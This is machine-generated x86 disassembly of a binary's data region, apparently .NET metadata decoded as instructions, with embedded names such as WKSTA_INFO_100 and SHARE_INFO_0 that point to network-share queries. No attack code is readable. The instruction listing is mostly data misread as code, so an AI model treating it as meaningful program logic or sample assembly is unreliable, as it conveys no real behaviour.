  402b5a:	19 00                	sbb    %eax,(%eax)
  402b5c:	11 00                	adc    %eax,(%eax)
  402b5e:	03 01                	add    (%ecx),%eax
  402b60:	10 00                	adc    %al,(%eax)
  402b62:	46                   	inc    %esi
  402b63:	00 00                	add    %al,(%eax)
  402b65:	00 41 00             	add    %al,0x0(%ecx)
  402b68:	1a 00                	sbb    (%eax),%al
  402b6a:	12 00                	adc    (%eax),%al
  402b6c:	11 00                	adc    %eax,(%eax)
  402b6e:	95                   	xchg   %eax,%ebp
  402b6f:	01 28                	add    %ebp,(%eax)
  402b71:	02 51 80             	add    -0x80(%ecx),%dl
  402b74:	d8 00                	fadds  (%eax)
  402b76:	2c 02                	sub    $0x2,%al
  402b78:	51                   	push   %ecx
  402b79:	80 a1 08 2f 02 06 00 	andb   $0x0,0x6022f08(%ecx)
  402b80:	89 01                	mov    %eax,(%ecx)
  402b82:	2f                   	das
  402b83:	02 06                	add    (%esi),%al
  402b85:	00 27                	add    %ah,(%edi)
  402b87:	02 6b 00             	add    0x0(%ebx),%ch
  402b8a:	06                   	push   %es
  402b8b:	00 29                	add    %ch,(%ecx)
  402b8d:	06                   	push   %es
  402b8e:	6b 00 06             	imul   $0x6,(%eax),%eax
  402b91:	00 aa 06 2f 02 06    	add    %ch,0x6022f06(%edx)
  402b97:	00 b4 06 2f 02 06 00 	add    %dh,0x6022f(%esi,%eax,1)
  402b9e:	4a                   	dec    %edx
  402b9f:	02 6b 00             	add    0x0(%ebx),%ch
  402ba2:	06                   	push   %es
  402ba3:	00 57 02             	add    %dl,0x2(%edi)
  402ba6:	6b 00 06             	imul   $0x6,(%eax),%eax
  402ba9:	00 78 02             	add    %bh,0x2(%eax)
  402bac:	2c 02                	sub    $0x2,%al
  402bae:	06                   	push   %es
  402baf:	00 c2                	add    %al,%dl
  402bb1:	04 6b                	add    $0x6b,%al
  402bb3:	00 06                	add    %al,(%esi)
  402bb5:	06                   	push   %es
  402bb6:	12 01                	adc    (%ecx),%al
  402bb8:	2c 02                	sub    $0x2,%al
  402bba:	56                   	push   %esi
  402bbb:	80 a1 08 32 02 56 80 	andb   $0x80,0x56023208(%ecx)
  402bc2:	ce                   	into
  402bc3:	00 32                	add    %dh,(%edx)
  402bc5:	02 56 80             	add    -0x80(%esi),%dl
  402bc8:	97                   	xchg   %eax,%edi
  402bc9:	06                   	push   %es
  402bca:	32 02                	xor    (%edx),%al
  402bcc:	56                   	push   %esi
  402bcd:	80 8c 02 32 02 56 80 	orb    $0xfe,-0x7fa9fdce(%edx,%eax,1)
  402bd4:	fe 
  402bd5:	04 32                	add    $0x32,%al
  402bd7:	02 06                	add    (%esi),%al
  402bd9:	06                   	push   %es
  402bda:	12 01                	adc    (%ecx),%al
  402bdc:	2c 02                	sub    $0x2,%al
  402bde:	56                   	push   %esi
  402bdf:	80 b4 00 36 02 56 80 	xorb   $0x5,-0x7fa9fdca(%eax,%eax,1)
  402be6:	05 
  402be7:	01 36                	add    %esi,(%esi)
  402be9:	02 56 80             	add    -0x80(%esi),%dl
  402bec:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  402bed:	00 36                	add    %dh,(%esi)
  402bef:	02 56 80             	add    -0x80(%esi),%dl
  402bf2:	9d                   	popf
  402bf3:	00 36                	add    %dh,(%esi)
  402bf5:	02 56 80             	add    -0x80(%esi),%dl
  402bf8:	ed                   	in     (%dx),%eax
  402bf9:	00 36                	add    %dh,(%esi)
  402bfb:	02 06                	add    (%esi),%al
  402bfd:	00 43 09             	add    %al,0x9(%ebx)
  402c00:	3a 02                	cmp    (%edx),%al
  402c02:	06                   	push   %es
  402c03:	00 87 06 6b 00 06    	add    %al,0x6006b06(%edi)
  402c09:	00 7e 00             	add    %bh,0x0(%esi)
  402c0c:	3d 02 50 20 00       	cmp    $0x205002,%eax
  402c11:	00 00                	add    %al,(%eax)
  402c13:	00 96 08 0f 07 41    	add    %dl,0x41070f08(%esi)
  402c19:	02 01                	add    (%ecx),%al
  402c1b:	00 57 20             	add    %dl,0x20(%edi)
  402c1e:	00 00                	add    %al,(%eax)
  402c20:	00 00                	add    %al,(%eax)
  402c22:	96                   	xchg   %eax,%esi
  402c23:	08 1e                	or     %bl,(%esi)
  402c25:	07                   	pop    %es
  402c26:	46                   	inc    %esi
  402c27:	02 01                	add    (%ecx),%al
  402c29:	00 00                	add    %al,(%eax)
  402c2b:	00 00                	add    %al,(%eax)
  402c2d:	00 80 00 96 20 14    	add    %al,0x14209600(%eax)
  402c33:	06                   	push   %es
  402c34:	4c                   	dec    %esp
  402c35:	02 02                	add    (%edx),%al
  402c37:	00 00                	add    %al,(%eax)
  402c39:	00 00                	add    %al,(%eax)
  402c3b:	00 80 00 91 20 b1    	add    %al,-0x4edf6f00(%eax)
  402c41:	01 54 02 05          	add    %edx,0x5(%edx,%eax,1)
  402c45:	00 00                	add    %al,(%eax)
  402c47:	00 00                	add    %al,(%eax)
  402c49:	00 80 00 91 20 3f    	add    %al,0x3f209100(%eax)
  402c4f:	05 59 02 06 00       	add    $0x60259,%eax
  402c54:	60                   	pusha
  402c55:	20 00                	and    %al,(%eax)
  402c57:	00 00                	add    %al,(%eax)
  402c59:	00 96 00 f2 07 69    	add    %dl,0x6907f200(%esi)
  402c5f:	02 0d 00 24 21 00    	add    0x212400,%cl
  402c65:	00 00                	add    %al,(%eax)
  402c67:	00 96 00 75 08 70    	add    %dl,0x70087500(%esi)
  402c6d:	02 0e                	add    (%esi),%cl
  402c6f:	00 9c 21 00 00 00 00 	add    %bl,0x0(%ecx,%eiz,1)
  402c76:	96                   	xchg   %eax,%esi
  402c77:	00 00                	add    %al,(%eax)
  402c79:	08 79 02             	or     %bh,0x2(%ecx)
  402c7c:	0e                   	push   %cs
  402c7d:	00 30                	add    %dh,(%eax)
  402c7f:	22 00                	and    (%eax),%al
  402c81:	00 00                	add    %al,(%eax)
  402c83:	00 96 00 8a 08 82    	add    %dl,-0x7df77600(%esi)
  402c89:	02 0f                	add    (%edi),%cl
  402c8b:	00 cc                	add    %cl,%ah
  402c8d:	23 00                	and    (%eax),%eax
  402c8f:	00 00                	add    %al,(%eax)
  402c91:	00 96 00 e0 07 8a    	add    %dl,-0x75f82000(%esi)
  402c97:	02 0f                	add    (%edi),%cl
  402c99:	00 f4                	add    %dh,%ah
  402c9b:	25 00 00 00 00       	and    $0x0,%eax
  402ca0:	96                   	xchg   %eax,%esi
  402ca1:	00 c7                	add    %al,%bh
  402ca3:	07                   	pop    %es
  402ca4:	90                   	nop
  402ca5:	02 11                	add    (%ecx),%dl
  402ca7:	00 b8 26 00 00 00    	add    %bh,0x26(%eax)
  402cad:	00 91 00 38 08 79    	add    %dl,0x79083800(%ecx)
  402cb3:	02 13                	add    (%ebx),%dl
  402cb5:	00 a8 27 00 00 00    	add    %ch,0x27(%eax)
  402cbb:	00 91 00 57 05 9a    	add    %dl,-0x65faa900(%ecx)
  402cc1:	02 14 00             	add    (%eax,%eax,1),%dl
  402cc4:	7b 28                	jnp    0x402cee
  402cc6:	00 00                	add    %al,(%eax)
  402cc8:	00 00                	add    %al,(%eax)
  402cca:	86 18                	xchg   %bl,(%eax)
  402ccc:	e1 06                	loope  0x402cd4
  402cce:	06                   	push   %es
  402ccf:	00 15 00 83 28 00    	add    %dl,0x288300
  402cd5:	00 00                	add    %al,(%eax)
  402cd7:	00 86 18 e1 06 a0    	add    %al,-0x5ff91ee8(%esi)
  402cdd:	02 15 00 9a 28 00    	add    0x289a00,%dl
  402ce3:	00 00                	add    %al,(%eax)
  402ce5:	00 c6                	add    %al,%dh
  402ce7:	00 b9 04 61 00 18    	add    %bh,0x18006104(%ecx)
  402ced:	00 a2 28 00 00 00    	add    %ah,0x28(%edx)
  402cf3:	00 86 18 e1 06 06    	add    %al,0x606e118(%esi)
  402cf9:	00 18                	add    %bl,(%eax)
  402cfb:	00 aa 28 00 00 00    	add    %ch,0x28(%edx)
  402d01:	00 86 18 e1 06 06    	add    %al,0x606e118(%esi)
  402d07:	00 18                	add    %bl,(%eax)
  402d09:	00 b2 28 00 00 00    	add    %dh,0x28(%edx)
  402d0f:	00 83 00 33 00 06    	add    %al,0x6003300(%ebx)
  402d15:	00 18                	add    %bl,(%eax)
  402d17:	00 00                	add    %al,(%eax)
  402d19:	00 01                	add    %al,(%ecx)
  402d1b:	00 64 04 00          	add    %ah,0x0(%esp,%eax,1)
  402d1f:	00 01                	add    %al,(%ecx)
  402d21:	00 3f                	add    %bh,(%edi)
  402d23:	02 00                	add    (%eax),%al
  402d25:	00 02                	add    %al,(%edx)
  402d27:	00 f0                	add    %dh,%al
  402d29:	04 02                	add    $0x2,%al
  402d2b:	00 03                	add    %al,(%ebx)
  402d2d:	00 f5                	add    %dh,%ch
  402d2f:	06                   	push   %es
  402d30:	00 00                	add    %al,(%eax)
  402d32:	01 00                	add    %eax,(%eax)
  402d34:	52                   	push   %edx
  402d35:	06                   	push   %es
  402d36:	00 00                	add    %al,(%eax)
  402d38:	01 00                	add    %eax,(%eax)
  402d3a:	1c 02                	sbb    $0x2,%al
  402d3c:	00 00                	add    %al,(%eax)
  402d3e:	02 00                	add    (%eax),%al
  402d40:	f0 04 00             	lock add $0x0,%al
  402d43:	00 03                	add    %al,(%ebx)
  402d45:	00 e7                	add    %ah,%bh
  402d47:	06                   	push   %es
  402d48:	00 00                	add    %al,(%eax)
  402d4a:	04 00                	add    $0x0,%al
  402d4c:	4c                   	dec    %esp
  402d4d:	05 00 00 05 00       	add    $0x50000,%eax
  402d52:	45                   	inc    %ebp
  402d53:	01 00                	add    %eax,(%eax)
  402d55:	00 06                	add    %al,(%esi)
  402d57:	00 a2 07 00 00 07    	add    %ah,0x7000007(%edx)
  402d5d:	00 fd                	add    %bh,%ch
  402d5f:	01 00                	add    %eax,(%eax)
  402d61:	00 01                	add    %al,(%ecx)
  402d63:	00 90 06 00 00 01    	add    %dl,0x1000006(%eax)
  402d69:	00 97 08 00 00 01    	add    %dl,0x1000008(%edi)
  402d6f:	00 87 06 10 10 02    	add    %al,0x2101006(%edi)
  402d75:	00 43 09             	add    %al,0x9(%ebx)
  402d78:	00 00                	add    %al,(%eax)
  402d7a:	01 00                	add    %eax,(%eax)
  402d7c:	97                   	xchg   %eax,%edi
  402d7d:	08 10                	or     %dl,(%eax)
  402d7f:	10 02                	adc    %al,(%edx)
  402d81:	00 43 09             	add    %al,0x9(%ebx)
  402d84:	00 00                	add    %al,(%eax)
  402d86:	01 00                	add    %eax,(%eax)
  402d88:	97                   	xchg   %eax,%edi
  402d89:	08 00                	or     %al,(%eax)
  402d8b:	00 01                	add    %al,(%ecx)
  402d8d:	00 26                	add    %ah,(%esi)
  402d8f:	08 00                	or     %al,(%eax)
  402d91:	00 01                	add    %al,(%ecx)
  402d93:	00 35 02 00 00 02    	add    %dh,0x2000002
  402d99:	00 82 02 00 00 03    	add    %al,0x3000002(%edx)
  402d9f:	00 c7                	add    %al,%bh
  402da1:	04 09                	add    $0x9,%al
  402da3:	00 e1                	add    %ah,%cl
  402da5:	06                   	push   %es
  402da6:	01 00                	add    %eax,(%eax)
  402da8:	11 00                	adc    %eax,(%eax)
  402daa:	e1 06                	loope  0x402db2
  402dac:	06                   	push   %es
  402dad:	00 19                	add    %bl,(%ecx)
  402daf:	00 e1                	add    %ah,%cl
  402db1:	06                   	push   %es
  402db2:	0a 00                	or     (%eax),%al
  402db4:	29 00                	sub    %eax,(%eax)
  402db6:	e1 06                	loope  0x402dbe
  402db8:	10 00                	adc    %al,(%eax)
  402dba:	31 00                	xor    %eax,(%eax)
  402dbc:	e1 06                	loope  0x402dc4
  402dbe:	10 00                	adc    %al,(%eax)
  402dc0:	39 00                	cmp    %eax,(%eax)
  402dc2:	e1 06                	loope  0x402dca
  402dc4:	10 00                	adc    %al,(%eax)
  402dc6:	41                   	inc    %ecx
  402dc7:	00 e1                	add    %ah,%cl
  402dc9:	06                   	push   %es
  402dca:	10 00                	adc    %al,(%eax)
  402dcc:	49                   	dec    %ecx
  402dcd:	00 e1                	add    %ah,%cl
  402dcf:	06                   	push   %es
  402dd0:	10 00                	adc    %al,(%eax)
  402dd2:	51                   	push   %ecx
  402dd3:	00 e1                	add    %ah,%cl
  402dd5:	06                   	push   %es
  402dd6:	10 00                	adc    %al,(%eax)
  402dd8:	59                   	pop    %ecx
  402dd9:	00 e1                	add    %ah,%cl
  402ddb:	06                   	push   %es
  402ddc:	10 00                	adc    %al,(%eax)
  402dde:	61                   	popa
  402ddf:	00 e1                	add    %ah,%cl
  402de1:	06                   	push   %es
  402de2:	15 00 69 00 e1       	adc    $0xe1006900,%eax
  402de7:	06                   	push   %es
  402de8:	10 00                	adc    %al,(%eax)
  402dea:	71 00                	jno    0x402dec
  402dec:	e1 06                	loope  0x402df4
  402dee:	10 00                	adc    %al,(%eax)
  402df0:	79 00                	jns    0x402df2
  402df2:	e1 06                	loope  0x402dfa
  402df4:	10 00                	adc    %al,(%eax)
  402df6:	89 00                	mov    %eax,(%eax)
  402df8:	e1 06                	loope  0x402e00
  402dfa:	06                   	push   %es
  402dfb:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402dfe:	e1 06                	loope  0x402e06
  402e00:	06                   	push   %es
  402e01:	00 09                	add    %cl,(%ecx)
  402e03:	01 eb                	add    %ebp,%ebx
  402e05:	01 34 00             	add    %esi,(%eax,%eax,1)
  402e08:	19 01                	sbb    %eax,(%ecx)
  402e0a:	87 04 3d 00 21 01 24 	xchg   %eax,0x24012100(,%edi,1)
  402e11:	06                   	push   %es
  402e12:	44                   	inc    %esp
  402e13:	00 99 00 e1 06 10    	add    %bl,0x1006e100(%ecx)
  402e19:	00 19                	add    %bl,(%ecx)
  402e1b:	01 b6 02 47 00 0c    	add    %esi,0xc004702(%esi)
  402e21:	00 66 01             	add    %ah,0x1(%esi)
  402e24:	4f                   	dec    %edi
  402e25:	00 21                	add    %ah,(%ecx)
  402e27:	01 fe                	add    %edi,%esi
  402e29:	05 55 00 0c 00       	add    $0xc0055,%eax
  402e2e:	3b 09                	cmp    (%ecx),%ecx
  402e30:	5b                   	pop    %ebx
  402e31:	00 29                	add    %ch,(%ecx)
  402e33:	01 b9 04 61 00 31    	add    %edi,0x31006104(%ecx)
  402e39:	01 b8 08 65 00 31    	add    %edi,0x31006508(%eax)
  402e3f:	01 aa 09 6b 00 14    	add    %ebp,0x14006b09(%edx)
  402e45:	00 e1                	add    %ah,%cl
  402e47:	06                   	push   %es
  402e48:	06                   	push   %es
  402e49:	00 39                	add    %bh,(%ecx)
  402e4b:	01 5c 05 84          	add    %ebx,-0x7c(%ebp,%eax,1)
  402e4f:	00 39                	add    %bh,(%ecx)
  402e51:	01 5f 08             	add    %ebx,0x8(%edi)
  402e54:	8a 00                	mov    (%eax),%al
  402e56:	49                   	dec    %ecx
  402e57:	01 d3                	add    %edx,%ebx
  402e59:	06                   	push   %es
  402e5a:	90                   	nop
  402e5b:	00 b1 00 f9 08 95    	add    %dh,-0x6af70700(%ecx)
  402e61:	00 14 00             	add    %dl,(%eax,%eax,1)
  402e64:	66 01 4f 00          	add    %cx,0x0(%edi)
  402e68:	b1 00                	mov    $0x0,%cl
  402e6a:	26 09 99 00 b9 00 dc 	or     %ebx,%es:-0x23ff4700(%ecx)
  402e71:	02 06                	add    (%esi),%al
  402e73:	00 1c 00             	add    %bl,(%eax,%eax,1)
  402e76:	d3 06                	roll   %cl,(%esi)
  402e78:	b2 00                	mov    $0x0,%dl
  402e7a:	24 00                	and    $0x0,%al
  402e7c:	f9                   	stc
  402e7d:	08 c1                	or     %al,%cl
  402e7f:	00 51 01             	add    %dl,0x1(%ecx)
  402e82:	15 08 c6 00 81       	adc    $0x8100c608,%eax
  402e87:	00 b9 04 61 00 31    	add    %bh,0x31006104(%ecx)
  402e8d:	01 2f                	add    %ebp,(%edi)
  402e8f:	08 cd                	or     %cl,%ch
  402e91:	00 59 01             	add    %bl,0x1(%ecx)
  402e94:	64 02 d2             	fs add %dl,%dl
  402e97:	00 24 00             	add    %ah,(%eax,%eax,1)
  402e9a:	26 09 99 00 1c 00 e1 	or     %ebx,%es:-0x1effe400(%ecx)
  402ea1:	06                   	push   %es
  402ea2:	06                   	push   %es
  402ea3:	00 14 00             	add    %dl,(%eax,%eax,1)
  402ea6:	10 09                	adc    %cl,(%ecx)
  402ea8:	f2 00 61 01          	repnz add %ah,0x1(%ecx)
  402eac:	05 09 f6 00 61       	add    $0x6100f609,%eax
  402eb1:	01 13                	add    %edx,(%ebx)
  402eb3:	02 61 00             	add    0x0(%ecx),%ah
  402eb6:	31 01                	xor    %eax,(%ecx)
  402eb8:	d8 08                	fmuls  (%eax)
  402eba:	fc                   	cld
  402ebb:	00 14 00             	add    %dl,(%eax,%eax,1)
  402ebe:	2f                   	das
  402ebf:	05 03 01 31 01       	add    $0x1310103,%eax
  402ec4:	bf 08 09 01 d9       	mov    $0xd9010908,%edi
  402ec9:	00 e1                	add    %ah,%cl
  402ecb:	06                   	push   %es
  402ecc:	10 00                	adc    %al,(%eax)
  402ece:	e1 00                	loope  0x402ed0
  402ed0:	e1 06                	loope  0x402ed8
  402ed2:	0f 01 e1             	smsw   %ecx
  402ed5:	00 7c 06 10          	add    %bh,0x10(%esi,%eax,1)
  402ed9:	00 e1                	add    %ah,%cl
  402edb:	00 de                	add    %bl,%dh
  402edd:	08 01                	or     %al,(%ecx)
  402edf:	00 e1                	add    %ah,%cl
  402ee1:	00 7a 04             	add    %bh,0x4(%edx)
  402ee4:	01 00                	add    %eax,(%eax)
  402ee6:	e1 00                	loope  0x402ee8
  402ee8:	51                   	push   %ecx
  402ee9:	01 15 01 71 01 66    	add    %edx,0x66017101
  402eef:	01 1b                	add    %ebx,(%ebx)
  402ef1:	01 e1                	add    %esp,%ecx
  402ef3:	00 f6                	add    %dh,%dh
  402ef5:	04 20                	add    $0x20,%al
  402ef7:	01 79 01             	add    %edi,0x1(%ecx)
  402efa:	d3 06                	roll   %cl,(%esi)
  402efc:	90                   	nop
  402efd:	00 e9                	add    %ch,%cl
  402eff:	00 af 07 26 01 81    	add    %ch,-0x7efed9f9(%edi)
  402f05:	01 2f                	add    %ebp,(%edi)
  402f07:	05 2c 01 49 01       	add    $0x149012c,%eax
  402f0c:	10 09                	adc    %cl,(%ecx)
  402f0e:	f2 00 89 01 2f 05 33 	repnz add %cl,0x33052f01(%ecx)
  402f15:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  402f18:	66 01 4f 00          	add    %cx,0x0(%edi)
  402f1c:	59                   	pop    %ecx
  402f1d:	01 64 02 38          	add    %esp,0x38(%edx,%eax,1)
  402f21:	01 31                	add    %esi,(%ecx)
  402f23:	01 bf 08 5f 01 91    	add    %edi,-0x6efea0f8(%edi)
  402f29:	01 be 07 66 01 99    	add    %edi,-0x66fe99f9(%esi)
  402f2f:	01 2f                	add    %ebp,(%edi)
  402f31:	08 6c 01 1c          	or     %ch,0x1c(%ecx,%eax,1)
  402f35:	00 10                	add    %dl,(%eax)
  402f37:	09 f2                	or     %esi,%edx
  402f39:	00 2c 00             	add    %ch,(%eax,%eax,1)
  402f3c:	e1 06                	loope  0x402f44
  402f3e:	06                   	push   %es
  402f3f:	00 a9 01 e1 06 9d    	add    %ch,-0x62f91eff(%ecx)
  402f45:	01 f1                	add    %esi,%ecx
  402f47:	00 e1                	add    %ah,%cl
  402f49:	06                   	push   %es
  402f4a:	a3 01 f1 00 20       	mov    %eax,0x2000f101
  402f4f:	09 06                	or     %eax,(%esi)
  402f51:	00 2c 00             	add    %ch,(%eax,%eax,1)
  402f54:	66 01 4f 00          	add    %cx,0x0(%edi)
  402f58:	2c 00                	sub    $0x0,%al
  402f5a:	d3 06                	roll   %cl,(%esi)
  402f5c:	b2 00                	mov    $0x0,%dl
  402f5e:	34 00                	xor    $0x0,%al
  402f60:	f9                   	stc
  402f61:	08 c1                	or     %al,%cl
  402f63:	00 f1                	add    %dh,%cl
  402f65:	00 6d 05             	add    %ch,0x5(%ebp)
  402f68:	06                   	push   %es
  402f69:	00 34 00             	add    %dh,(%eax,%eax,1)
  402f6c:	26 09 99 00 59 01 64 	or     %ebx,%es:0x64015900(%ecx)
  402f73:	02 bd 01 59 01 64    	add    0x64015901(%ebp),%bh
  402f79:	02 c3                	add    %bl,%al
  402f7b:	01 31                	add    %esi,(%ecx)
  402f7d:	01 a2 09 c8 01 b1    	add    %esp,-0x4efe37f7(%edx)
  402f83:	01 2d 07 d6 01 31    	add    %ebp,0x3101d607
  402f89:	01 86 09 dc 01 81    	add    %eax,-0x7efe23f7(%esi)
  402f8f:	00 e1                	add    %ah,%cl
  402f91:	06                   	push   %es
  402f92:	06                   	push   %es
  402f93:	00 09                	add    %cl,(%ecx)
  402f95:	00 08                	add    %cl,(%eax)
  402f97:	00 f4                	add    %dh,%ah
  402f99:	01 08                	add    %ecx,(%eax)
  402f9b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402f9e:	f9                   	stc
  402f9f:	01 09                	add    %ecx,(%ecx)
  402fa1:	00 38                	add    %bh,(%eax)
  402fa3:	00 f9                	add    %bh,%cl
  402fa5:	01 09                	add    %ecx,(%ecx)
  402fa7:	00 3c 00             	add    %bh,(%eax,%eax,1)
  402faa:	fe 01                	incb   (%ecx)
  402fac:	09 00                	or     %eax,(%eax)
  402fae:	40                   	inc    %eax
  402faf:	00 03                	add    %al,(%ebx)
  402fb1:	02 02                	add    (%edx),%al
  402fb3:	00 41 00             	add    %al,0x0(%ecx)
  402fb6:	26 02 09             	add    %es:(%ecx),%cl
  402fb9:	00 44 00 08          	add    %al,0x8(%eax,%eax,1)
  402fbd:	02 09                	add    (%ecx),%cl
  402fbf:	00 48 00             	add    %cl,0x0(%eax)
  402fc2:	0d 02 02 00 49       	or     $0x49000202,%eax
  402fc7:	00 26                	add    %ah,(%esi)
  402fc9:	02 09                	add    (%ecx),%cl
  402fcb:	00 50 00             	add    %dl,0x0(%eax)
  402fce:	f9                   	stc
  402fcf:	01 09                	add    %ecx,(%ecx)
  402fd1:	00 54 00 12          	add    %dl,0x12(%eax,%eax,1)
  402fd5:	02 09                	add    (%ecx),%cl
  402fd7:	00 58 00             	add    %bl,0x0(%eax)
  402fda:	17                   	pop    %ss
  402fdb:	02 09                	add    (%ecx),%cl
  402fdd:	00 5c 00 1c          	add    %bl,0x1c(%eax,%eax,1)
  402fe1:	02 09                	add    (%ecx),%cl
  402fe3:	00 60 00             	add    %ah,0x0(%eax)
  402fe6:	21 02                	and    %eax,(%edx)
  402fe8:	20 00                	and    %al,(%eax)
  402fea:	7b 00                	jnp    0x402fec
  402fec:	12 02                	adc    (%edx),%al
  402fee:	21 00                	and    %eax,(%eax)
  402ff0:	7b 00                	jnp    0x402ff2
  402ff2:	12 02                	adc    (%edx),%al
  402ff4:	2e 00 0b             	add    %cl,%cs:(%ebx)
  402ff7:	00 ac 02 2e 00 13 00 	add    %ch,0x13002e(%edx,%eax,1)
  402ffe:	b5 02                	mov    $0x2,%ch
  403000:	2e 00 1b             	add    %bl,%cs:(%ebx)
  403003:	00 d4                	add    %dl,%ah
  403005:	02 2e                	add    (%esi),%ch
  403007:	00 23                	add    %ah,(%ebx)
  403009:	00 dd                	add    %bl,%ch
  40300b:	02 2e                	add    (%esi),%ch
  40300d:	00 2b                	add    %ch,(%ebx)
  40300f:	00 ee                	add    %ch,%dh
  403011:	02 2e                	add    (%esi),%ch
  403013:	00 33                	add    %dh,(%ebx)
  403015:	00 ee                	add    %ch,%dh
  403017:	02 2e                	add    (%esi),%ch
  403019:	00 3b                	add    %bh,(%ebx)
  40301b:	00 ee                	add    %ch,%dh
  40301d:	02 2e                	add    (%esi),%ch
  40301f:	00 43 00             	add    %al,0x0(%ebx)
  403022:	dd 02                	fldl   (%edx)
  403024:	2e 00 4b 00          	add    %cl,%cs:0x0(%ebx)
  403028:	f4                   	hlt
  403029:	02 2e                	add    (%esi),%ch
  40302b:	00 53 00             	add    %dl,0x0(%ebx)
  40302e:	ee                   	out    %al,(%dx)
  40302f:	02 2e                	add    (%esi),%ch
  403031:	00 5b 00             	add    %bl,0x0(%ebx)
  403034:	ee                   	out    %al,(%dx)
  403035:	02 2e                	add    (%esi),%ch
  403037:	00 63 00             	add    %ah,0x0(%ebx)
  40303a:	0c 03                	or     $0x3,%al
  40303c:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  403040:	36 03 2e             	add    %ss:(%esi),%ebp
  403043:	00 73 00             	add    %dh,0x0(%ebx)
  403046:	43                   	inc    %ebx
  403047:	03 40 00             	add    0x0(%eax),%eax
  40304a:	7b 00                	jnp    0x40304c
  40304c:	12 02                	adc    (%edx),%al
  40304e:	03 01                	add    (%ecx),%eax
  403050:	7b 00                	jnp    0x403052
  403052:	12 02                	adc    (%edx),%al
  403054:	23 01                	and    (%ecx),%eax
  403056:	7b 00                	jnp    0x403058
  403058:	12 02                	adc    (%edx),%al
  40305a:	1a 00                	sbb    (%eax),%al
  40305c:	6e                   	outsb  %ds:(%esi),(%dx)
  40305d:	00 9d 00 d9 00 3d    	add    %bl,0x3d00d900(%ebp)
  403063:	01 7e 01             	add    %edi,0x1(%esi)
  403066:	b1 01                	mov    $0x1,%cl
  403068:	cd 01                	int    $0x1
  40306a:	02 00                	add    (%eax),%al
  40306c:	01 00                	add    %eax,(%eax)
  40306e:	00 00                	add    %al,(%eax)
  403070:	30 07                	xor    %al,(%edi)
  403072:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403073:	02 02                	add    (%edx),%al
  403075:	00 01                	add    %al,(%ecx)
  403077:	00 03                	add    %al,(%ebx)
  403079:	00 01                	add    %al,(%ecx)
  40307b:	00 02                	add    %al,(%edx)
  40307d:	00 03                	add    %al,(%ebx)
  40307f:	00 0f                	add    %cl,(%edi)
  403081:	05 2d 00 7d 00       	add    $0x7d002d,%eax
  403086:	ac                   	lods   %ds:(%esi),%al
  403087:	00 bb 00 96 01 aa    	add    %bh,-0x55fe6a00(%ebx)
  40308d:	01 40 01             	add    %eax,0x1(%eax)
  403090:	07                   	pop    %es
  403091:	00 14 06             	add    %dl,(%esi,%eax,1)
  403094:	01 00                	add    %eax,(%eax)
  403096:	40                   	inc    %eax
  403097:	01 09                	add    %ecx,(%ecx)
  403099:	00 b1 01 01 00 04    	add    %dh,0x4000101(%ecx)
  40309f:	01 0b                	add    %ecx,(%ebx)
  4030a1:	00 3f                	add    %bh,(%edi)
  4030a3:	05 01 00 04 80       	add    $0x80040001,%eax
  4030a8:	00 00                	add    %al,(%eax)
  4030aa:	01 00                	add    %eax,(%eax)
	...
  4030b8:	d4 07                	aam    $0x7
  4030ba:	00 00                	add    %al,(%eax)
  4030bc:	04 00                	add    $0x0,%al
	...
  4030c6:	00 00                	add    %al,(%eax)
  4030c8:	e2 01                	loop   0x4030cb
  4030ca:	1a 01                	sbb    (%ecx),%al
  4030cc:	00 00                	add    %al,(%eax)
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	04 00                	add    $0x0,%al
	...
  4030da:	00 00                	add    %al,(%eax)
  4030dc:	e2 01                	loop   0x4030df
  4030de:	38 05 00 00 00 00    	cmp    %al,0x0
  4030e4:	04 00                	add    $0x0,%al
	...
  4030ee:	00 00                	add    %al,(%eax)
  4030f0:	eb 01                	jmp    0x4030f3
  4030f2:	7a 07                	jp     0x4030fb
  4030f4:	00 00                	add    %al,(%eax)
  4030f6:	00 00                	add    %al,(%eax)
  4030f8:	04 00                	add    $0x0,%al
	...
  403102:	00 00                	add    %al,(%eax)
  403104:	e2 01                	loop   0x403107
  403106:	a0 02 00 00 00       	mov    0x2,%al
  40310b:	00 03                	add    %al,(%ebx)
  40310d:	00 02                	add    %al,(%edx)
  40310f:	00 04 00             	add    %al,(%eax,%eax,1)
  403112:	02 00                	add    (%eax),%al
  403114:	05 00 02 00 06       	add    $0x6000200,%eax
  403119:	00 02                	add    %al,(%edx)
  40311b:	00 07                	add    %al,(%edi)
  40311d:	00 02                	add    %al,(%edx)
  40311f:	00 08                	add    %cl,(%eax)
  403121:	00 02                	add    %al,(%edx)
  403123:	00 09                	add    %cl,(%ecx)
  403125:	00 02                	add    %al,(%edx)
  403127:	00 87 00 7a 01 00    	add    %al,0x17a00(%edi)
  40312d:	00 00                	add    %al,(%eax)
  40312f:	00 00                	add    %al,(%eax)
  403131:	57                   	push   %edi
  403132:	4b                   	dec    %ebx
  403133:	53                   	push   %ebx
  403134:	54                   	push   %esp
  403135:	41                   	inc    %ecx
  403136:	5f                   	pop    %edi
  403137:	49                   	dec    %ecx
  403138:	4e                   	dec    %esi
  403139:	46                   	inc    %esi
  40313a:	4f                   	dec    %edi
  40313b:	5f                   	pop    %edi
  40313c:	31 30                	xor    %esi,(%eax)
  40313e:	30 00                	xor    %al,(%eax)
  403140:	3c 3e                	cmp    $0x3e,%al
  403142:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  403145:	44                   	inc    %esp
  403146:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  40314d:	6c                   	insb   (%dx),%es:(%edi)
  40314e:	61                   	popa
  40314f:	73 73                	jae    0x4031c4
  403151:	31 39                	xor    %edi,(%ecx)
  403153:	5f                   	pop    %edi
  403154:	30 00                	xor    %al,(%eax)
  403156:	53                   	push   %ebx
  403157:	48                   	dec    %eax
  403158:	41                   	inc    %ecx
  403159:	52                   	push   %edx
  40315a:	45                   	inc    %ebp
  40315b:	5f                   	pop    %edi
  40315c:	49                   	dec    %ecx
  40315d:	4e                   	dec    %esi
  40315e:	46                   	inc    %esi
  40315f:	4f                   	dec    %edi
  403160:	5f                   	pop    %edi
  403161:	30 00                	xor    %al,(%eax)
  403163:	3c 47                	cmp    $0x47,%al
